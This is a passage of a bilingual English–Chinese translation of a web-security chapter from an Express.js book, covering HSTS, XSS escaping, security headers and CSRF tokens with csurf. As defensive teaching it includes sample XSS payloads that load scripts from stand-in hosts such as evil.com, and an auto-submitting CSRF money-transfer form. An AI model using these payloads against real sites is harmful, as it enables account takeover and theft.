  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 你还可以启用对子域的支持。如果你拥有 slime.biz，你可能希望为 cool.slime.biz 启用 HSTS。
- en: To set this header, we'll meet Helmet. Helmet is a module for setting helpful
    HTTP security headers in your Express applications. As we'll see throughout the
    chapter, it has various headers it can set. We'll start with its HSTS functionality.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 要设置这个头部，我们将遇到 Helmet。Helmet 是一个用于在 Express 应用程序中设置有用的 HTTP 安全头部的模块。正如我们将在本章中看到的那样，它有各种可以设置的头部。我们将从它的
    HSTS 功能开始。
- en: First, as always, `npm install helmet` in whatever project you're working on.
    I'd also recommend installing the `ms` module, which translates human-readable
    strings (like `"2 days"`) into 172,800,000 milliseconds. Now you can use the middleware!
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，像往常一样，在您正在工作的任何项目中运行 `npm install helmet`。我还建议安装 `ms` 模块，它将可读字符串（如 `"2 days"`)
    转换为 172,800,000 毫秒。现在你可以使用中间件了！
- en: Listing 10.7 Using Helmet's HSTS middleware
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10.7 使用 Helmet 的 HSTS 中间件
- en: '`var helmet = require("helmet");` `var ms = require("ms");` `// ...` `app.use(helmet.hsts({`
    `  maxAge: ms("1 year"),` `  includeSubdomains: true``}));`'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: '`var helmet = require("helmet");` `var ms = require("ms");` `// ...` `app.use(helmet.hsts({`
    `  maxAge: ms("1 year"),` `  includeSubdomains: true``}));`'
- en: Now, HSTS will be set on every request!
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，HSTS 将在每个请求上设置！
- en: Why can't we just use HSTS?
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 为什么我们不能只使用 HSTS？
- en: This header is only effective if your users are already on HTTPS, which is why
    we need `express-enforces-ssl`.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 只有当您的用户已经在 HTTPS 上时，这个头部才有效，这就是为什么我们需要 `express-enforces-ssl`。
- en: 10.3.2   Preventing cross-site scripting attacks (XSS)
  id: totrans-108
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.3.2 防止跨站脚本攻击（XSS）
- en: I probably shouldn't say this, but there are a lot of ways you could steal my
    money. You could beat me up and rob me, you could threaten me, or you could pickpocket
    me. If you were a hacker, you could also hack into my bank and wire a bunch of
    my money to you (and of all the options we listed, this is the one I most prefer).
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 我可能不应该说这个，但有很多种方法可以偷走我的钱。你可以打我并抢走我的东西，你可以威胁我，或者你可以扒我的口袋。如果你是一个黑客，你也可以黑入我的银行，并将一大笔钱转到你的账户上（在我们列出的所有选项中，这是我最喜欢的一个）。
- en: If you could get control of my browser, even if you didn't know my password,
    you could still get my money.  You could wait for me to log in, and then take
    control of my browser.  You'd tell my browser to go to the "wire money" page on
    my bank and take a large sum of money. If you were clever, you could hide it so
    that I'd never even know it happened (until, of course, all of my money was gone).
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你能够控制我的浏览器，即使你不知道我的密码，你仍然可以取走我的钱。你可以等待我登录，然后控制我的浏览器。你会告诉我的浏览器去我银行的“汇款”页面，并取走一大笔钱。如果你足够聪明，你可以隐藏它，以至于我甚至不知道发生了什么（当然，直到我的所有钱都花光了）。
- en: But how would you get control of my browser? Perhaps the most popular way would
    be through use of a cross-site scripting attack, also known as an XSS attack.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 但你是如何控制我的浏览器的呢？最流行的方式可能是通过使用跨站脚本攻击，也称为 XSS 攻击。
- en: Imagine that, on my bank's homepage, I can see a list of my contacts and their
    names.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 想象一下，在我的银行主页上，我能看到我的联系人和他们的名字列表。
- en: '![](../Images/10_02.png)'
  id: totrans-113
  prefs: []
  type: TYPE_IMG
  zh: '![图片](../Images/10_02.png)'
- en: Figure 10.2 A fictional list of my bank contacts.
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.2 一个虚构的银行联系人列表。
- en: 'Users have control over their names. Bruce Lee can go into his settings and
    change his name to "Bruce Springsteen" if he wants to. But what if he changed
    his name to this:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 用户可以控制自己的名字。布鲁斯·李可以进入他的设置，如果他想的话，可以将他的名字改为“布鲁斯·斯普林斯汀”。但如果他改成了这个名字：
- en: Bruce Lee<script>transferMoney(1000000, "bruce-lee's-account");</script>
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: 布鲁斯·李<script>transferMoney(1000000, "bruce-lee's-account");</script>
- en: The list of contacts would still show up the same, but now my web browser will
    also execute the code inside the `<script>` tag! Presumably, this will transfer
    a million dollars to Bruce Lee's account, and I'll never be the wiser. Bruce Lee
    could also add `<script src="http://brucelee.biz/hacker.js"></script>` to his
    name. This script could send data (like login information, for example) to brucelee.biz.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 联系人列表仍然会显示相同的内容，但现在我的浏览器也会执行`<script>`标签内的代码！可能这会将一百万美元转到布鲁斯·李的账户，而我却一无所知。布鲁斯·李也可以在他的名字中添加`<script
    src="http://brucelee.biz/hacker.js"></script>`。这个脚本可能会将数据（例如登录信息）发送到brucelee.biz。
- en: 'There''s one big way to prevent XSS: never blindly trust user input.'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 防止XSS的一个大方法是永远不要盲目信任用户输入。
- en: ESCAPING USER INPUT
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 清理用户输入
- en: When you have user input, it's almost always possible that they'll enter something
    malicious. In the example above, you could set your name to contain `<script>` tags,
    causing XSS issues. We can sanitize or "escape" user input, so that when we put
    it into our HTML, we aren't doing anything unexpected.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 当你收到用户输入时，几乎总是有可能他们输入一些恶意的内容。在上面的例子中，你可以将你的名字设置为包含`<script>`标签，从而引发XSS问题。我们可以对用户输入进行清理或“转义”，这样当我们将其放入HTML中时，就不会发生任何意外。
- en: Depending on where you're putting the user input, you'll sanitize things differently.
    As a general principle, you'll want to sanitize things as much as you can, and
    always keep the context in mind.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 根据你放置用户输入的位置，你将不同地清理内容。作为一个一般原则，你想要尽可能多地清理内容，并且始终考虑上下文。
- en: 'For example, if you''re putting some user content inside of HTML tags, you''ll
    want to make sure that it can''t define any HTML tags. You''ll want this kind
    of string:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，如果你将一些用户内容放入HTML标签中，你想要确保它不能定义任何HTML标签。你想要的字符串是这样的：
- en: Hello, `<script src="http://evil.com/hack.js"></script>` world.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: Hello，`<script src="http://evil.com/hack.js"></script>`world。
- en: 'To become something like this:'
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 要变成这样：
- en: '`Hello, &lt;script src="http://evil.com/hack.js"&gt;&lt;/script&gt;world.`'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: '`Hello，&lt;script src="http://evil.com/hack.js"&gt;&lt;/script&gt;world。`'
- en: By doing that, the script tags will be rendered useless.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 通过这样做，脚本标签将变得无用。
- en: This kind of escaping (and more) is handled by most templating engines for you.
    In EJS, simply use the default `<%= myString %>` and don't use the `<%- userString
    %>`. In Jade, this escaping is done by default. Unless you're certain that you
    don't want to sanitize something, make sure to use the "safe" version whenever
    you're dealing with user strings.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 这种转义（以及更多）通常由大多数模板引擎为你处理。在EJS中，只需使用默认的`<%= myString %>`，不要使用`<%- userString
    %>`。在Jade中，这种转义是默认的。除非你确定你不想清理某些内容，否则在处理用户字符串时，请确保使用“安全”版本。
- en: If you know that the user should be entering a URL, you'll want to do more than
    just escaping; you'll want to do your best to validate that something is a URL.
    You'll also want to call the built-in `encodeURI` function on a URL to make sure
    it's safe.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你知道用户应该输入一个URL，你不仅想要进行转义，你还想尽可能验证输入的内容确实是一个URL。你还需要在URL上调用内置的`encodeURI`函数以确保其安全性。
- en: If you're putting something inside of an HTML attribute, you'll want to make
    sure your users can't put quotation marks, for example. Unfortunately, there isn't
    a one-size-fits-all solution for sanitizing user input; the way you sanitize depends
    on the context. But you should always sanitize user input as much as you can.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你将某些内容放入HTML属性中，你想要确保用户不能放入引号，例如。不幸的是，没有一种通用的解决方案来清理用户输入；清理的方式取决于上下文。但你应该始终尽可能多地清理用户输入。
- en: You can also escape the input before you ever put it into your database. In
    the examples above, we're showing how to sanitize things whenever we're displaying
    them. But if you know that your users should enter homepages on their user profiles,
    it's also useful to sanitize that before you ever store it in the database. If
    I enter "hello, world" as my homepage, the server should give an error. If I enter
    http://evanhahn.com as my homepage, that should be allowed, and put into the database.
    This can have security benefits and user interface benefits.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 你也可以在将输入放入数据库之前对其进行清理。在上面的例子中，我们展示了在显示内容时如何进行清理。但如果你知道用户应该在他们的用户资料中输入主页，那么在将它们存储在数据库之前对其进行清理也是有用的。如果我输入“hello,
    world”作为我的主页，服务器应该给出错误。如果我输入http://evanhahn.com作为我的主页，那么应该允许，并放入数据库。这可以带来安全性和用户界面的好处。
- en: MITIGATING XSS WITH HTTP HEADERS
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 使用HTTP头部减轻XSS
- en: There's one other way to help mitigate XSS, but it's quite small, and that's
    through the use of HTTP headers. Once again, we'll break out Helmet.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 还有另一种帮助减轻XSS攻击的方法，但它相当小，那就是通过使用HTTP头信息。我们再次使用Helmet。
- en: 'There''s a simple security header called `X-XSS-Protection`. It can''t protect
    against all kinds of XSS, but it can protect against what''s called "reflected
    XSS". The best example of reflected XSS is on an insecure search engine. On every
    search engine, when you do a search, your query appears on the screen (usually
    at the top). If you search for "candy", the word "candy" will appear at the top,
    and it''ll be part of the URL:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 有一个简单的安全头信息叫做`X-XSS-Protection`。它不能保护所有类型的XSS攻击，但它可以保护所谓的“反射型XSS”。反射型XSS的最佳例子是不安全的搜索引擎。在每一个搜索引擎上，当你进行搜索时，你的查询会出现在屏幕上（通常在顶部）。如果你搜索“candy”，单词“candy”就会出现在顶部，并且它将成为URL的一部分：
- en: '`https://mysearchengine.biz/search?query=candy`'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: '`https://mysearchengine.biz/search?query=candy`'
- en: 'Now imagine you''re searching "`<script src="http://evil.com/hack.js"></script>"`.
    The URL might look something like this:'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 现在想象你正在搜索`<script src="http://evil.com/hack.js"></script>"`。URL可能看起来像这样：
- en: '`https://mysearchengine.biz/search?query=<script%20src="http://evil.com/hack.js"></script>`'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: '`https://mysearchengine.biz/search?query=<script%20src="http://evil.com/hack.js"></script>`'
- en: Now, if this search engine puts that query into the HTML of the page, you've
    injected a script into the page! If I send this URL to you and you click the link,
    I can take control and do malicious things.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，如果这个搜索引擎将这个查询放入页面的HTML中，你就在页面上注入了一个脚本！如果我把这个URL发给你，你点击链接，我就能控制并做恶意的事情。
- en: 'The first step against this attack is to sanitize the user''s input. After
    that, you can set a the `X-XSS-Protection` header to keep some browsers from running
    that script should you make a mistake. In Helmet, it''s just one line:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 防止这种攻击的第一步是清理用户的输入。之后，你可以设置`X-XSS-Protection`头信息，以防止某些浏览器在你犯错时运行该脚本。在Helmet中，这只是一行代码：
- en: Listing 10.8 Using Helmet to set the X-XSS-Protection header
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.8使用Helmet设置X-XSS-Protection头信息
- en: '`app.use(helmet.xssFilter());`'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.use(helmet.xssFilter());`'
- en: Helmet also lets you set another header called Content Security Policy. Frankly,
    Content Security Policy could be its own chapter. Check out the HTML5 Rocks guide
    at [http://www.html5rocks.com/en/tutorials/security/content-security-policy/](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)for
    more information, and once you understand it, use Helmet's `csp` middleware.
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: Helmet还允许你设置另一个头信息，称为内容安全策略（Content Security Policy）。坦白说，内容安全策略可以是一个独立的章节。查看HTML5
    Rocks指南[http://www.html5rocks.com/en/tutorials/security/content-security-policy/](http://www.html5rocks.com/en/tutorials/security/content-security-policy/)以获取更多信息，一旦你理解了它，就可以使用Helmet的`csp`中间件。
- en: Neither of these Helmet headers are anywhere near as important as sanitizing
    user input, so do those first!
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 这两个Helmet头信息远不如清理用户输入重要，所以先做那个！
- en: 10.3.3   Cross-site request forgery (CSRF) prevention
  id: totrans-143
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 10.3.3   跨站请求伪造（CSRF）预防
- en: 'Imagine that I''m logged into my bank. You want me to transfer a million dollars
    into your account, but you aren''t logged in as me. (Another challenge: I don''t
    have a million dollars.) How can you get me to send you the money?'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 假设我登录了我的银行账户。你希望我向你账户转账一百万美元，但你并没有以我的身份登录。（另一个挑战：我没有一百万美元。）你怎么让我把钱转给你？
- en: THE ATTACK
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击
- en: On the bank site, there's a "transfer money" form. On this form, one types the
    amount of money and the recipient of the money, and then they hit "Send". Behind
    the scenes, a POST request is being made to a URL. The bank will make sure my
    cookies are correct, and if they are, it'll wire the money.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 在银行网站上，有一个“转账”表单。在这个表单中，你输入金额和收款人信息，然后点击“发送”。在幕后，正在向一个URL发送POST请求。银行会确保我的cookie是正确的，如果是的话，就会转账。
- en: You can make the POST request with the amount and the recipient, but you don't
    know my cookie and you can't guess it; it's a long string of characters. So what
    if you could make me do the POST request? You'll do this with cross-site request
    forgery (shortened to CSRF, and sometimes XSRF).
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以用金额和收款人信息进行POST请求，但你不知道我的cookie，也无法猜测它；它是一长串字符。那么，如果你能让我执行POST请求呢？你会通过跨站请求伪造（简称CSRF，有时也称为XSRF）来做这件事。
- en: 'To pull off this CSRF attack, you''ll basically have me submit a form without
    knowing it. Imagine that you''ve made a form like this:'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 要实施这种CSRF攻击，你基本上会让我在不知情的情况下提交一个表单。想象一下，你已经制作了一个这样的表单：
- en: Listing 10.9 A first draft of a hacker form
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.9黑客表单的初稿
- en: '`<h1>Transfer money</h1>` `<form method="post" action="https://mybank.biz/transfermoney">`
    ``  <input name="recipient" `value="YourUsername"` type="text">`` ``  <input name="amount" `value="1000000"` type="number">``
    `  <input type="submit">``</form>`'
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: '`<h1>转账</h1>` `<form method="post" action="https://mybank.biz/transfermoney">`
    ``  <input name="recipient" `value="YourUsername"` type="text">`` ``  <input name="amount" `value="1000000"` type="number">``
    `  <input type="submit">``</form>`'
- en: 'Let''s say that you put this in an HTML file on a page you controlled; maybe
    it''s hacker.com/stealmoney.html. You could email me and say, "Click here to see
    some photos of my cat!" If I clicked on it, I would see something like this:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 假设你在一个你控制的页面上放了一个HTML文件；也许它是hacker.com/stealmoney.html。你可以给我发邮件说：“点击这里看看我猫的照片！”如果我点击了它，我会看到类似这样的内容：
- en: And if I see that, I'll get suspicious. I won't click "submit" and I'll close
    the window. But we can use JavaScript to automatically submit the form.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我看到这个，我会起疑。我不会点击“提交”，我会关闭窗口。但我们可以使用JavaScript自动提交表单。
- en: Listing 10.10 Automatically submitting the form
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.10 自动提交表单
- en: '`<form method="post" action="https://mybank.biz/transfermoney">` `  <!-- …
    -->` `</form>`   `<script>` `var formElement = document.querySelector("form");`
    `formElement.submit();``</script>`'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: '`<form method="post" action="https://mybank.biz/transfermoney">` `  <!-- …
    -->` `</form>`   `<script>` `var formElement = document.querySelector("form");`
    `formElement.submit();``</script>`'
- en: If I get sent to this page, the form will immediately submit and I'll be sent
    to my bank, to a page that says "Congratulations, you've just transferred a million
    dollars." I'll probably panic and call my bank, and the authorities can likely
    sort something out.
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我被发送到这个页面，表单将立即提交，然后我会被发送到我的银行，到一个显示“恭喜，您刚刚转账了一百万美元。”的页面。我可能会恐慌并拨打银行的电话，当局可能能够解决这个问题。
- en: But this is progress—you're now sending money to yourself. I won't show it here,
    but you can completely hide this from the victim. First, you make an `<iframe>` on
    your page. You can then use the form `target` attribute, so that when the form
    submits, it submits inside the `iframe`, rather than on the whole page. If you
    make this `iframe` small or invisible  (easy with CSS!), then I'd never know I
    was hacked until I suddenly had a million fewer dollars.
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 但这是进步——你现在是在给自己转账。我不会在这里展示，但你可以完全隐藏这一点，不让受害者知道。首先，你在页面上创建一个`<iframe>`。然后你可以使用表单的`target`属性，这样当表单提交时，它会在`iframe`内部提交，而不是在整个页面上提交。如果你把这个`iframe`做得很小或者让它不可见（CSS很容易做到这一点！），那么我可能直到突然少了百万美元才会意识到我被黑客攻击了。
- en: My bank needs to protect against this. But how?
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 我的银行需要防止这种情况。但怎么办呢？
- en: OVERVIEW OF PROTECTING AGAINST CSRF
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 防止CSRF攻击的概述
- en: My bank already checks cookies, to make sure that it's me. You can't perform
    CSRF attacks without getting me to do something. But once the bank knows it's
    me, how does it know that I meant to do something and wasn't being tricked into
    doing something?
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 我的银行已经检查了cookies，以确保是我本人。没有让我做点什么，你不能执行CSRF攻击。但一旦银行知道是我，它怎么知道我是有意为之，而不是被骗去做的？
- en: 'My bank decides this: if you''re submitting a POST request to mybank.biz/transfermoney,
    you''re not just doing that out of the blue. Before doing that POST, you''ll be
    on a page that''s asking you where you want to transfer your money--perhaps the
    URL is mybank.biz/transfermoney_form.'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 我的银行决定这样做：如果你向mybank.biz/transfermoney提交POST请求，你并不是无缘无故地这样做。在执行POST之前，你将在一个询问你想要将钱转到哪个账户的页面——可能URL是mybank.biz/transfermoney_form。
- en: 'So when the bank sends you the HTML for mybank.biz/transfermoney_form, it''s
    going to add a hidden element to the form: a completely random, unguessable string
    called a token. The form might now look like this:'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 所以当银行发送你mybank.biz/transfermoney_form的HTML时，它会在表单中添加一个隐藏元素：一个完全随机、不可猜测的字符串，称为令牌。表单现在可能看起来像这样：
- en: Listing 10.11 Adding CSRF protections
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.11 添加CSRF保护
- en: '`<h1>Transfer money</h1>` `<form method="post" action="https://mybank.biz/transfermoney">`
    `` `  <input name="_csrf" type="hidden"[CA]       #A` `` `` `   value="1dmkTNkhePMTB0DlGLhm">             
    #A` `` `  <input name="recipient" value="YourUsername" type="text">` `  <input
    name="amount" value="1000000" type="number">` `  <input type="submit">``</form>`'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: '`<h1>转账</h1>` `<form method="post" action="https://mybank.biz/transfermoney">`
    `` `  <input name="_csrf" type="hidden"[CA]       #A` `` `` `   value="1dmkTNkhePMTB0DlGLhm">             
    #A` `` `  <input name="recipient" value="YourUsername" type="text">` `  <input
    name="amount" value="1000000" type="number">` `  <input type="submit">``</form>`'
- en: '#A The value of the CSRF token will be different for every user, often every
    time. The above is just an example.'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: '#A CSRF令牌的值对每个用户都是不同的，通常每次都不同。上面的只是一个例子。'
- en: You've probably used thousands of CSRF tokens while browsing the web, but you
    haven't seen it because it's hidden from you. If you're like me and you enjoy
    viewing the HTML source of pages, you'll see CSRF tokens!
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 你在浏览网页时可能已经使用了成千上万的CSRF令牌，但你没有看到它，因为它对你来说是隐藏的。如果你像我一样喜欢查看页面的HTML源代码，你会看到CSRF令牌！
- en: Now, when you submit the form and send the POST request, my bank will make sure
    that the CSRF token I send is the same as the one I just received. If it is, the
    bank can be pretty sure that I just came from the bank's website and therefore
    intended to send the money.  If it's not, I might be being hacked—don't send the
    money.
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，当你提交表单并发送POST请求时，我的银行将确保我发送的CSRF令牌与我刚刚接收的是同一个。如果是，银行可以相当肯定我刚刚来自银行的网站，因此意图发送钱。如果不是，我可能正在被黑客攻击——不要发送钱。
- en: 'In short, we need to do two things:'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 简而言之，我们需要做两件事：
- en: 1.  Create a random CSRF token every time we're asking users for data
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 1. 每次我们向用户请求数据时创建一个随机的CSRF令牌
- en: 2.  Validate that random token every time we deal with that data
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 2. 每次我们处理那些数据时验证这个随机令牌
- en: PROTECTING AGAINST CSRF IN EXPRESS
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 在Express中保护CSRF
- en: 'The Express team has a simple middleware that does those two tasks: `csurf` (at
    https://github.com/expressjs/csurf). The `csurf` middleware does two things:'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: Express团队有一个简单的中间件可以完成这两个任务：`csurf`（在https://github.com/expressjs/csurf）。`csurf`中间件做两件事：
- en: 1.  Adds a method to the request object called `req.csrfToken`. You'll send
    this token whenever you send a form, for example.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 1. 为请求对象添加一个名为`req.csrfToken`的方法。你发送表单时将发送这个令牌，例如。
- en: 2.  If the request is anything other than a GET, it looks for a parameter called `_csrf` to
    validate the request, creating an error if it's invalid. (Technically, it skips
    also skips HEAD and OPTIONS requests, but those are much less common. There are
    also a few other places the middleware will search for CSRF tokens; consult the
    documentation for more.)
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 2. 如果请求不是GET，它将寻找一个名为`_csrf`的参数来验证请求，如果无效则创建一个错误。（技术上，它也会跳过HEAD和OPTIONS请求，但这些请求很少见。中间件还会在其他几个地方搜索CSRF令牌；请参阅文档以获取更多信息。）
- en: To install this middleware, just run `npm install csurf --save`.
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 要安装这个中间件，只需运行`npm install csurf --save`。
- en: The `csurf` middleware depends on some kind of session middleware and middleware
    to parse request bodies. If you need CSRF protections, you probably have some
    notion of users, which means that you're probably already using these, but`express-session` and `body-parser` do
    the job. Make sure you're using those before you use `csurf`. If you need an example,
    you can check out Chapter 8's code for `app.js`, or look at the CSRF example app
    at https://github.com/EvanHahn/Express.js-in-Action-code/blob/master/Chapter_10/csrf-example/app.js.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: '`csurf`中间件依赖于某种session中间件和解析请求体的中间件。如果你需要CSRF保护，你可能有关于用户的概念，这意味着你可能已经在使用这些中间件了，但`express-session`和`body-parser`可以完成这项工作。确保你在使用`csurf`之前使用它们。如果你需要一个例子，你可以查看第8章的`app.js`代码，或者查看CSRF示例应用在https://github.com/EvanHahn/Express.js-in-Action-code/blob/master/Chapter_10/csrf-example/app.js。'
- en: 'To use the middleware, simply `require` and `use` it:'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用中间件，只需`require`和`use`它：
- en: Listing 10.12 Using the CSRF middleware
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.12 使用CSRF中间件
- en: '`var csrf = require("csurf");` `// …``app.use(csrf()); #A`'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: '`var csrf = require("csurf");` `// …``app.use(csrf()); #A`'
- en: '#A Make sure to include a body parser and session middleware before this.'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 在此之前，请确保包含一个body parser和session中间件。'
- en: 'Once you''ve used the middleware, you can grab the token when rendering a view,
    like so:'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你使用了中间件，你可以在渲染视图时获取令牌，如下所示：
- en: Listing 10.13 Getting the CSRF token
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.13 获取CSRF令牌
- en: '`app.get("/", function(req, res) {` `  res.render("myview", {` `    csrfToken:
    req.csrfToken()` `  });``});`'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: '`app.get("/", function(req, res) {` `  res.render("myview", {` `    csrfToken:
    req.csrfToken()` `  });``});`'
- en: 'Now, inside of a view, you''ll output the `csrfToken` variable into a hidden
    input called `_csrf`. It might look like this in an EJS template:'
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，在视图中，你将`csrfToken`变量输出到一个名为`_csrf`的隐藏输入中。在EJS模板中可能看起来像这样：
- en: Listing 10.14 Showing the CSRF token in a form
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.14 在表单中显示CSRF令牌
- en: '`<form method="post" action="/submit">` `  <input name="_csrf" value="<%= csrfToken
    %>" type="hidden">` `  <! -- … -->``</form>`'
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: '`<form method="post" action="/submit">` `  <input name="_csrf" value="<%= csrfToken
    %>" type="hidden">` `  <! -- … -->``</form>`'
- en: And that's all! Once you've added the CSRF token to your forms, the `csurf` middleware
    will take care of the rest.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 就这些了！一旦你将CSRF令牌添加到你的表单中，`csurf`中间件就会处理剩下的工作。
- en: 'It''s not required, but you''ll probably want to have some kind of handler
    for failed CSRF.  Define an error middleware that checks for a CSRF error. For
    example:'
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然这不是必需的，但你可能想要为失败的CSRF定义某种处理程序。定义一个错误中间件来检查CSRF错误。例如：
- en: Listing 10.15 Handling CSRF errors
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 列表10.15处理CSRF错误
- en: '`// …`   `app.use(function(err, req, res, next) {` `  if (err.code !== "EBADCSRFTOKEN")
    {   #A` `    next(err);                          #A` `    return;                            
    #A` `  }                                     #A` `  res.status(403);   #B` ` 
    res.send("CSRF error.");` `});`  `// …`'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: '`// …`   `app.use(function(err, req, res, next) {` `  if (err.code !== "EBADCSRFTOKEN")
    {   #A` `    next(err);                          #A` `    return;                            
    #A` `  }                                     #A` `  res.status(403);   #B` ` 
    res.send("CSRF error.");` `});`  `// …`'
- en: '#A We''ll skip this handler if it''s not a CSRF error.'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: '#A 如果这不是CSRF错误，我们将跳过这个处理程序。'
- en: '#B Error code 403 is "Forbidden".'
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: '#B 错误代码403是"禁止"。'
- en: This error handler will return "CSRF error" if there's, well, a CSRF error.
    You might want to customize this error page and you might also want this to send
    you a message—someone's trying to hack one of your users!
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 如果有CSRF错误，这个错误处理程序将返回"CSRF错误"。你可能想要自定义这个错误页面，也可能想要收到消息——有人正在尝试攻击你的用户之一！
- en: You can place this error handler wherever in your error stack you'd like. If
    you want it to be the first error you catch, put it first. If you want it to be
    last, you can put it last.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以将这个错误处理程序放在你的错误堆栈中的任何位置。如果你想让它成为第一个捕获的错误，就把它放在第一位。如果你想让它成为最后一个，你可以把它放在最后。
- en: 10.4  Keeping your dependencies safe
  id: totrans-194
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 10.4  确保你的依赖项安全
- en: 'Any Express application will depend on at least one third-party module: Express.
    If the rest of this book has shown you anything, it''s that you''ll be depending
    on lots of third-party modules. This has the huge advantage that you don''t have
    to write a lot of boilerplate code, but it does come with one cost: you''re putting
    your trust in these modules. What if the module creates a security problem?'
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
